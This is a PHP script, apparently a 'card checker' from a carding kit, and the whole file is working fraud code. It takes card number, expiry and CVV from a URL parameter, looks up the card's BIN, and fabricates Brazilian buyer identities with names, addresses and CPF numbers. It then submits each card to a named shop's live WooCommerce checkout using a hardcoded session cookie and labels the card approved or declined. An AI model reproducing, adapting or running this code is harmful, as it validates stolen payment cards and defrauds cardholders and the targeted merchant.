<?php
$time = time();

    error_reporting(0);
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
    function puxar($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }
$bin1 = substr($cc, 0, 6); 
$file = 'bins.csv'; 
$searchfor = $bin1; 
$contents = file_get_contents($file); 
$pattern = preg_quote($searchfor, '/'); 
$pattern = "/^.*$pattern.*\$/m"; 
if (preg_match_all($pattern, $contents, $matches)) { 
    $encontrada = implode("\n", $matches[0]); 
}
$pieces = explode(";", $encontrada); 
$c = count($pieces);
if ($c == 8) { 
    $pais = $pieces[4]; 
    $paiscode = $pieces[5]; 
    $banco = $pieces[2]; 
    $level = $pieces[3]; 
    $bandeira = $pieces[1]; 
} else { 
    $pais = $pieces[5]; 
    $paiscode = $pieces[6]; 
    $link = $pieces[7]; 
    $level = $pieces[4]; 
    $banco = $pieces[2]; 
    $bandeira = $pieces[1]; 
}


if (file_exists(getcwd()."/cookies.txt")) {
        unlink(getcwd()."/cookies.txt");
    }

// ========================================  ARRAYS RANDOMS..  ========================================


$nomes = array("José", "Fernando", "Roberto", "Marcelo", "João", "John", "Kleiton", "Marcos", "Rogerio", "Jhon", "Flavio", "Renato");
$nome_pessoa = $nomes[array_rand($nomes)];

$sobrenomes = array("Silva", "Silas", "Souza", "Santos", "Neto", "Lobato", "Santos", "Almeida", "Albuquerque", "Dantas", "Raia");
$sobrenome_pessoa = $sobrenomes[array_rand($sobrenomes)];

$telefone = array("11996452030", "17996458520", "15981569021", "16997261414", "11991457785", "17996412563", "12991920020", "11996452030");
$generator_tel = $telefone[array_rand($telefone)];

$cidade = array("Americo de Campos", "Votuporanga", "Mirassol", "Baddy Bassit", "Populina", "Nhandeara", "Tanabi", "Macaubal", "Riolandia", "Nova Granada", "Mirassolandia");
$generator_cidade = $cidade[array_rand($cidade)];

$endereco = array("Av. Jucelino Kubishek", "Angelino dantas", "Antonio Salles", "Frederico Raia", "Rua das Palmeiras", "Sebastiao netos");
$generator_adress = $endereco[array_rand($endereco)];

$numero_casa = array("434", "543", "554", "123", "113", "345", "567", "678", "964", "1245", "386", "444");
$generator_nmrcasa = $numero_casa[array_rand($numero_casa)];

$complemento = array("Casa", "Apartamento", "Condominio");
$local_casa = $complemento[array_rand($complemento)];

$bairro = array("Jardim Alvorada", "Boa vista", "Capao redondo", "Campo das flores", "Clube dos 40", "Mattarazo", "Colinas");
$setar_bairro = $bairro[array_rand($bairro)];

$cepodemadeira = array("15550-000", "15180-000", "15120-000", "15440-000", "15410-200", "12150-000", "11220-280");
$generator_cep = $cepodemadeira[array_rand($cepodemadeira)];

$cpf = array("64604473811", "50953732894", "39673765839", "21629860867", "78202171890", "78705131804", "11945001887", "00181920840", "57238048809");
$generator_cpf = $cpf[array_rand($cpf)];

// ========================================  ARRAYS RANDOMS..  ========================================


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, "https://tatuapeconceito.com.br/?wc-ajax=checkout&elementor_page_id=20");
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_HTTPHEADER, array(

'accept: application/json, text/javascript, */*; q=0.01',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: wordpress_logged_in_d761679331eb56c2d78dd6e5a468a8c6=serverbrcomputer2032%7C1660628043%7CsL22pBwDrAxFCfAHXVc42nBGeBRDPDUTmt3VEevWKvt%7C602c55ee8ffaf87acadf7f8be4a0812518419060e9241981af78a13126fb914b; woocommerce_items_in_cart=1; woocommerce_cart_hash=517013aad3a61cf05a1be50fb22594b2; wp_woocommerce_session_d761679331eb56c2d78dd6e5a468a8c6=1650%7C%7C1660628044%7C%7C1660624444%7C%7Ca10d6e267520f1b51b16aa64997cc8df',
'origin: https://tatuapeconceito.com.br',
'referer: https://tatuapeconceito.com.br/finalizar-compra/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 OPR/89.0.4447.83',
'x-requested-with: XMLHttpRequest'

));
curl_setopt($ini, CURLOPT_POSTFIELDS, 'billing_first_name='.$nome_pessoa.'&billing_last_name='.$sobrenome_pessoa.'&billing_country=BR&billing_address_1='.$generator_adress.'&billing_address_2='.$local_casa.'&billing_numero='.$generator_nmrcasa.'&billing_city='.$generator_cidade.'&billing_state=SP&billing_postcode='.$generator_cep.'&billing_phone='.$generator_tel.'&billing_email=serverbrcomputer2032%40gmail.com&shipping_first_name='.$nome_pessoa.'&shipping_last_name='.$sobrenome_pessoa.'&shipping_company=Nenhuma&shipping_country=BR&shipping_address_1=&shipping_address_2=&shipping_city='.$generator_cidade.'&shipping_state=SP&shipping_postcode='.$generator_cep.'&order_comments=&cs_field_doc='.$generator_cpf.'&shipping_method%5B0%5D=correios-sedex2&payment_method=rede_credit&rede_credit_number='.$cc.'&rede_credit_installments=1&rede_credit_holder_name='.$nome_pessoa.'+'.$sobrenome_pessoa.'&rede_credit_expiry='.$mes.'+%2F+'.$ano.'&rede_credit_cvc='.$cvv.'&mercadopago_ticket%5BdocType%5D=CPF&mercadopago_ticket%5BdocNumber%5D=&mercadopago_ticket%5Bsite_id%5D=mlb&mercadopago_ticket%5Bamount%5D=132.97&mercadopago_ticket%5Bcurrency_ratio%5D=1&mercadopago_ticket%5Bcampaign_id%5D=&mercadopago_ticket%5Bcampaign%5D=&mercadopago_ticket%5Bdiscount%5D=&woocommerce-process-checkout-nonce=f8d8fe1796&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review%26elementor_page_id%3D20');
$meupiru = curl_exec($ini);

$retorno = puxar($meupiru, '<\/strong>','\t\t<\/li>');
$tomanocu = puxar($meupiru, '\n\t\t\tN','\t\t<\/li>');


if(strpos($meupiru, 'failure')!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> $retorno $tomanocu » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

}
else{

    echo "<span class='badge badge-success'>#Aprovada</span> ✔ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span>  $retorno » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

}

?>